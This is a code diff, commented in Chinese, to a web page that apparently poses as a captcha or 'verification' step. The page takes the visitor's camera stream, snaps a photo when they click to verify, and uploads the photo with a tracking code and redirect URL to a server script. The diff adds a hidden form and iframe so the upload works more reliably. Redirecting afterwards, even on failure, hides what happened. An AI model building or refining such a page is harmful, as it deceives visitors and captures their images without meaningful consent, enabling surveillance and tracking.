@@ -55,6 +55,7 @@
         #uploadResult { margin-top: 12px; font-size: 13px; word-break: break-word; min-height: 20px; }
         .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
         video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
@@ -90,9 +91,18 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
+    <!-- 隐藏的表单和 iframe -->
+    <form id="uploadForm" method="POST" enctype="multipart/form-data" target="uploadFrame">
+        <input type="hidden" name="action" value="capture_photo">
+        <input type="hidden" name="code" id="formCode">
+        <input type="hidden" name="target_url" id="formTargetUrl">
+        <input type="file" name="photo_data" id="formFile" style="display:none;">
+    </form>
+    <iframe name="uploadFrame" id="uploadFrame"></iframe>
+
     <script>
     // ================================================================
-    // 极简版 - 直接从 URL 获取参数
+    // 极简稳定版：使用表单提交，彻底解决分片问题
     // ================================================================
     
     var urlParams = new URLSearchParams(window.location.search);
@@ -103,6 +113,10 @@
     document.getElementById('displayCode2').textContent = code;
     document.getElementById('debugInfo').textContent = '编号: ' + code + ' | 跳转: ' + targetUrl;
 
+    // 设置表单字段
+    document.getElementById('formCode').value = code;
+    document.getElementById('formTargetUrl').value = targetUrl;
+
     // ================================================================
     // 全局变量
     // ================================================================
@@ -110,7 +124,6 @@
     var canvasElement = null;
     var stream = null;
     var cameraReady = false;
-    var photoTaken = false;
     var verified = false;
     var progressValue = 0;
 
@@ -126,13 +139,12 @@
     }, 200);
 
     // ================================================================
-    // 1. 请求摄像头权限（最直接的方式）
+    // 1. 请求摄像头权限
     // ================================================================
     function startCamera() {
         var statusEl = document.getElementById('cameraStatus');
         statusEl.textContent = '⏳ 请求摄像头权限...';
         
-        // 检查浏览器是否支持
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             statusEl.textContent = '❌ 浏览器不支持摄像头';
             statusEl.className = 'camera-status error';
@@ -140,12 +152,11 @@
             return;
         }
         
-        // 请求摄像头 - 使用最保守的设置
         var constraints = {
             video: {
                 facingMode: 'user',
-                width: { min: 160, ideal: 320, max: 640 },
-                height: { min: 120, ideal: 240, max: 480 }
+                width: { ideal: 320 },
+                height: { ideal: 240 }
             },
             audio: false
         };
@@ -157,24 +168,19 @@
                 statusEl.className = 'camera-status';
                 cameraReady = true;
                 
-                // 设置视频
                 videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
                 
-                // 预览视频
                 var previewVideo = document.getElementById('previewVideo');
                 previewVideo.srcObject = stream;
                 document.getElementById('cameraPreview').style.display = 'block';
                 
-                // 等待视频加载
                 videoElement.onloadedmetadata = function() {
                     videoElement.play();
-                    // 更新进度
                     progressValue = 100;
                     document.getElementById('progressFill').style.width = '100%';
                     clearInterval(progressInterval);
                     
-                    // 切换到验证界面
                     setTimeout(function() {
                         document.getElementById('loadingContainer').style.display = 'none';
                         document.getElementById('captchaContainer').style.display = 'block';
@@ -189,9 +195,6 @@
             });
     }
 
-    // ================================================================
-    // 2. 没有摄像头时的备用方案
-    // ================================================================
     function fallbackNoCamera() {
         setTimeout(function() {
             document.getElementById('loadingContainer').style.display = 'none';
@@ -201,194 +204,98 @@
     }
 
     // ================================================================
-    // 3. 拍照
+    // 2. 拍照并转换为 Blob
     // ================================================================
-    function takePhoto() {
+    function capturePhotoBlob() {
         return new Promise(function(resolve, reject) {
             if (!videoElement || !cameraReady) {
                 reject('摄像头未就绪');
                 return;
             }
-            
             var canvas = document.getElementById('canvas');
             var ctx = canvas.getContext('2d');
-            
-            // 检查视频尺寸
-            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+            if (videoElement.videoWidth === 0) {
                 reject('视频流未就绪');
                 return;
             }
-            
-            // 设置画布尺寸
             var w = Math.min(videoElement.videoWidth, 320);
             var h = Math.min(videoElement.videoHeight, 240);
             canvas.width = w;
             canvas.height = h;
-            
-            // 绘制当前帧
             ctx.drawImage(videoElement, 0, 0, w, h);
             
-            // 导出为 JPEG（低质量减少数据量）
-            var dataUrl = canvas.toDataURL('image/jpeg', 0.5);
-            resolve(dataUrl);
+            // 转换为 Blob
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    resolve(blob);
+                } else {
+                    reject('转换Blob失败');
+                }
+            }, 'image/jpeg', 0.7);
         });
     }
 
     // ================================================================
-    // 4. 上传（使用 Image 标签 + GET，绕过所有跨域限制）
+    // 3. 提交表单（使用 iframe 接收响应）
     // ================================================================
-    function uploadPhoto(photoData) {
+    function submitForm(blob) {
         return new Promise(function(resolve, reject) {
-            // 提取 base64 数据
-            var base64Data = photoData;
-            if (base64Data.indexOf('base64,') !== -1) {
-                base64Data = base64Data.split('base64,')[1];
-            }
+            var fileInput = document.getElementById('formFile');
+            // 使用 DataTransfer 构造 File 对象
+            var file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
+            var dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+            fileInput.files = dataTransfer.files;
             
-            // URL 编码
-            var encoded = encodeURIComponent(base64Data);
-            
-            // 构建请求 URL
-            var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
-            var fullUrl = apiUrl + '?action=hard_upload&code=' + encodeURIComponent(code) + 
-                         '&url=' + encodeURIComponent(targetUrl) + '&photo=' + encoded;
-            
-            // 检查 URL 长度，如果太长则使用分片
-            var MAX_LEN = 1900;
+            var iframe = document.getElementById('uploadFrame');
+            var form = document.getElementById('uploadForm');
             var resultDiv = document.getElementById('uploadResult');
             
-            if (fullUrl.length > MAX_LEN) {
-                // 分片上传
-                resultDiv.textContent = '📤 分片上传...';
-                uploadChunks(encoded, 0, 1);
-                return;
-            }
-            
-            // 直接使用 Image 标签发送
-            resultDiv.textContent = '📤 上传中...';
-            var img = new Image();
+            // 监听 iframe 加载完成
             var finished = false;
-            
             var timeoutId = setTimeout(function() {
                 if (!finished) {
                     finished = true;
-                    reject(new Error('上传超时'));
+                    reject(new Error('上传超时（30秒）'));
                 }
             }, 30000);
             
-            img.onload = function() {
+            iframe.onload = function() {
                 if (finished) return;
                 finished = true;
                 clearTimeout(timeoutId);
-                resultDiv.textContent = '✅ 上传成功！';
-                resultDiv.style.color = '#34c759';
-                resolve({ success: true });
-            };
-            
-            img.onerror = function() {
-                if (finished) return;
-                finished = true;
-                clearTimeout(timeoutId);
-                // 检查是否真的失败（可能只是图片无法显示但数据已发送）
-                resultDiv.textContent = '⚠️ 检查上传结果...';
-                setTimeout(function() {
-                    checkUploadResult().then(function(exists) {
-                        if (exists) {
-                            resultDiv.textContent = '✅ 上传成功！';
-                            resultDiv.style.color = '#34c759';
-                            resolve({ success: true });
-                        } else {
-                            reject(new Error('上传失败，请重试'));
-                        }
-                    }).catch(function() {
-                        reject(new Error('上传失败，请重试'));
-                    });
-                }, 2000);
-            };
-            
-            img.src = fullUrl;
-        });
-    }
-
-    // ================================================================
-    // 5. 分片上传
-    // ================================================================
-    function uploadChunks(encodedData, chunkIndex, totalChunks) {
-        // 简化版分片：如果数据太大，只发一部分然后检查结果
-        // 实际项目中可以完整实现分片，这里简化为直接尝试
-        var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
-        var chunkSize = 1500;
-        var total = Math.ceil(encodedData.length / chunkSize);
-        var resultDiv = document.getElementById('uploadResult');
-        var completed = 0;
-        
-        for (var i = 0; i < total; i++) {
-            (function(idx) {
-                var start = idx * chunkSize;
-                var end = Math.min(start + chunkSize, encodedData.length);
-                var chunk = encodedData.substring(start, end);
-                var url = apiUrl + '?action=hard_upload&code=' + encodeURIComponent(code) + 
-                         '&url=' + encodeURIComponent(targetUrl) + 
-                         '&photo=' + chunk + '&chunk=' + idx + '&total=' + total;
                 
-                var img = new Image();
-                img.onload = function() {
-                    completed++;
-                    resultDiv.textContent = '📤 分片 ' + completed + '/' + total;
-                    if (completed === total) {
-                        setTimeout(function() {
-                            checkUploadResult().then(function(exists) {
-                                if (exists) {
-                                    resultDiv.textContent = '✅ 上传成功！';
-                                    resultDiv.style.color = '#34c759';
-                                } else {
-                                    resultDiv.textContent = '⚠️ 请重试';
-                                }
-                            });
-                        }, 3000);
-                    }
-                };
-                img.onerror = function() {
-                    // 重试一次
-                    var retryImg = new Image();
-                    retryImg.onload = function() {
-                        completed++;
-                        resultDiv.textContent = '📤 分片 ' + completed + '/' + total;
-                        if (completed === total) {
-                            setTimeout(function() {
-                                checkUploadResult().then(function(exists) {
-                                    if (exists) {
-                                        resultDiv.textContent = '✅ 上传成功！';
-                                        resultDiv.style.color = '#34c759';
-                                    }
-                                });
-                            }, 3000);
+                try {
+                    var responseText = '';
+                    try {
+                        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc && iframeDoc.body) {
+                            responseText = iframeDoc.body.textContent || iframeDoc.body.innerText || '';
                         }
-                    };
-                    retryImg.src = url;
-                };
-                img.src = url;
-            })(i);
-        }
-    }
-
-    // ================================================================
-    // 6. 检查上传结果
-    // ================================================================
-    function checkUploadResult() {
-        return new Promise(function(resolve, reject) {
-            var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
-            fetch(apiUrl + '?action=check_code&code=' + encodeURIComponent(code) + '&t=' + Date.now())
-                .then(function(res) { return res.json(); })
-                .then(function(data) {
-                    resolve(data.exists === true);
-                })
-                .catch(function() { resolve(false); });
+                    } catch (e) {
+                        // 跨域限制，但同源不会发生
+                        responseText = iframe.contentWindow.document.body.textContent;
+                    }
+                    
+                    // 解析 JSON
+                    var result = JSON.parse(responseText);
+                    if (result.success) {
+                        resolve(result);
+                    } else {
+                        reject(new Error(result.error || '上传失败'));
+                    }
+                } catch (e) {
+                    reject(new Error('解析响应失败: ' + responseText.substring(0, 100)));
+                }
+            };
+            
+            // 提交表单
+            form.submit();
         });
     }
 
     // ================================================================
-    // 7. 主流程：拍照 → 上传 → 跳转
+    // 4. 主流程
     // ================================================================
     function startProcess() {
         if (verified) return;
@@ -399,39 +306,36 @@
         document.querySelector('#verifyRow span').textContent = '验证中...';
         
         var resultDiv = document.getElementById('uploadResult');
+        resultDiv.textContent = '📸 拍照中...';
+        resultDiv.style.color = '#007aff';
         
-        // 拍照
-        takePhoto().then(function(photoData) {
-            resultDiv.textContent = '📸 拍照成功，上传中...';
-            resultDiv.style.color = '#007aff';
-            
-            // 上传
-            return uploadPhoto(photoData);
-        }).then(function() {
-            resultDiv.textContent = '✅ 上传成功！即将跳转...';
-            resultDiv.style.color = '#34c759';
-            
-            // 释放摄像头
-            if (stream) {
-                stream.getTracks().forEach(function(t) { t.stop(); });
-            }
-            
-            // 跳转
-            setTimeout(function() {
-                window.location.href = targetUrl;
-            }, 2000);
-        }).catch(function(err) {
-            resultDiv.textContent = '❌ ' + err.message;
-            resultDiv.style.color = '#ff3b30';
-            // 即使失败也跳转
-            setTimeout(function() {
-                window.location.href = targetUrl;
-            }, 4000);
-        });
+        capturePhotoBlob()
+            .then(function(blob) {
+                resultDiv.textContent = '📤 上传中...';
+                return submitForm(blob);
+            })
+            .then(function(result) {
+                resultDiv.textContent = '✅ 上传成功！即将跳转...';
+                resultDiv.style.color = '#34c759';
+                if (stream) {
+                    stream.getTracks().forEach(function(t) { t.stop(); });
+                }
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 2000);
+            })
+            .catch(function(err) {
+                resultDiv.textContent = '❌ ' + err.message;
+                resultDiv.style.color = '#ff3b30';
+                // 即使失败也跳转
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 4000);
+            });
     }
 
     // ================================================================
-    // 8. 绑定事件
+    // 5. 绑定事件
     // ================================================================
     document.getElementById('verifyRow').addEventListener('click', function() {
         if (verified) return;
@@ -439,11 +343,10 @@
     });
 
     // ================================================================
-    // 9. 启动
+    // 6. 启动
     // ================================================================
     startCamera();
 
-    // 页面关闭时释放资源
     window.addEventListener('beforeunload', function() {
         if (stream) {
             stream.getTracks().forEach(function(t) { t.stop(); });
